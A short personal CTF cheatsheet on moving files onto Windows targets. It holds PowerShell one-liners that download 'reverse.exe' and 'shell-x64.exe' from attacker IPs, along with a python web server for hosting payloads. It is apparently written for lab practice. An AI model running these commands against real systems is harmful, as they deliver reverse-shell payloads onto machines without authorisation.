# CTF Tricks

#CTF #Cheatsheet #FileTransfer #PowerShell #Windows

Scratch snippets that come up on nearly every box. Attacker web server is `8001` and reverse-shell catchers start at `9001`, matching the vault's port convention.

## Download a file to a Windows target

```powershell
# Invoke-WebRequest (PS 3.0+)
powershell -c 'Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe'

# WebClient — works on older PowerShell where IWR is missing or slow
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.192.69:8001/shell-x64.exe','shell-x64.exe')"
```

`curl` and `wget` also exist on modern Windows as aliases, but on PowerShell 5.x they map to `Invoke-WebRequest` and behave differently from the Linux binaries — prefer the explicit forms above.

## Serve files from the attacker box

```bash
# Read-only, zero dependencies
python3 -m http.server 8001
```

For anything needing **upload**, HTTPS, or basic auth, use [updog](https://github.com/sc0tfree/updog) — a drop-in replacement for `SimpleHTTPServer` that handles uploads and ad-hoc TLS.

> [!note] See [[Tools/File Transfer/python-http-server|python-http-server]] and [[Tools/File Transfer/uploadserver|uploadserver]] for the fuller write-ups, and [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]] for the full transfer matrix.
